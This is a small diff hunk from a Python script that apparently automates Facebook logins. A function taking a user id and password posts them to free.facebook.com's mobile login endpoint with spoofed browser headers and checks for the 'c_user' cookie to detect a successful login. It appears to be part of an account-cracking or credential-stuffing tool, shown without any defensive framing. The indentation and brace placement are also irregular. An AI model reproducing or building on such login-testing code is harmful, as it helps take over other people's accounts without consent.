@@ -690,7 +690,6 @@ def apk(uid,pwx,tl):
     'sec-purpose': 'prefetch;prerender',
     'upgrade-insecure-requests': '1',
      'user-agent': pro}
-    'viewport-width': '980',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
